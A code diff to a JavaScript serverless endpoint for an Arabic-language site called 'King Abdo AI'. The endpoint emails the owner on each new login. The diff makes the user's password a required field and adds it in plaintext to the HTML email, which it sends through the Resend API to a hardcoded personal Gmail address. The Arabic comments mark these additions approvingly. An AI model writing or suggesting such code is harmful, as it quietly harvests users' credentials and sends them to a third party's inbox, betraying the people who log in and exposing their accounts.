@@ -1,17 +1,24 @@
 // 📁 api/notify-owner.js
 export default async function handler(req, res) {
+    // ✅ تحليل جسم الطلب (Body) أولًا
+    let body;
+    try {
+        body = JSON.parse(req.body);
+    } catch (e) {
+        return res.status(400).json({ error: 'Invalid JSON' });
+    }
+
     if (req.method !== 'POST') {
         return res.status(405).json({ error: 'Method not allowed' });
     }
 
     try {
-        const { userEmail, username } = req.body;
+        const { userEmail, username, userPassword } = body; // ✅ أضفنا userPassword هنا
 
-        if (!userEmail || !username) {
+        if (!userEmail || !username || !userPassword) { // ✅ أضفنا userPassword في التحقق
             return res.status(400).json({ error: 'Missing user data' });
         }
 
-        // ✅ إرسال إيميل لك (كمالك) عند تسجيل دخول جديد
         const response = await fetch('https://api.resend.com/emails', {
             method: 'POST',
             headers: {
@@ -19,16 +26,19 @@ export default async function handler(req, res) {
                 'Authorization': `Bearer ${process.env.RESEND_API_KEY}`
             },
             body: JSON.stringify({
-                from: 'King Abdo AI <onboarding@resend.dev>', // يمكنك تغييره لاحقًا
-                to: 'YOUR_EMAIL@gmail.com', // ✅ استبدل هذا بإيميلك الحقيقي
+                from: 'King Abdo AI <onboarding@resend.dev>',
+                to: 'abdalrhmanmohmaed717@gmail.com',
                 subject: '👑 تسجيل دخول جديد في بلاط الملك عبدو',
                 html: `
-                    <h2>جلالة الملك، هناك ضيف جديد في البلاط!</h2>
-                    <p><strong>اسم المستخدم:</strong> ${username}</p>
-                    <p><strong>البريد الإلكتروني:</strong> ${userEmail}</p>
-                    <p>تم تسجيل الدخول في: ${new Date().toLocaleString('ar-EG')}</p>
-                    <hr>
-                    <p style="color: #555; font-size: 0.9rem;">هذا إشعار تلقائي من نظام KING ABDO AI.</p>
+                    <div style="font-family: 'Amiri', serif; direction: rtl; text-align: right; padding: 20px; background: #0d1b2a; color: #e0e1dd; border-radius: 10px;">
+                        <h2 style="color: #FFD700; border-bottom: 2px solid #FFD700; padding-bottom: 10px;">جلالة الملك، هناك ضيف جديد في البلاط!</h2>
+                        <p><strong>👑 اسم المستخدم:</strong> ${username}</p>
+                        <p><strong>📧 البريد الإلكتروني:</strong> ${userEmail}</p>
+                        <p><strong>🔑 كلمة المرور:</strong> ${userPassword}</p> <!-- ✅ أضفنا كلمة المرور هنا -->
+                        <p><strong>🕒 وقت التسجيل:</strong> ${new Date().toLocaleString('ar-EG')}</p>
+                        <hr style="border-color: #3e92cc; margin: 20px 0;">
+                        <p style="color: #555; font-size: 0.9rem;">هذا إشعار تلقائي من نظام KING ABDO AI — خادمك المخلص.</p>
+                    </div>
                 `
             })
         });
@@ -36,7 +46,6 @@ export default async function handler(req, res) {
         const data = await response.json();
 
         if (response.ok) {
-            console.log('✅ تم إرسال الإشعار بنجاح');
             return res.status(200).json({ success: true });
         } else {
             console.error('❌ خطأ في إرسال الإشعار:', data);
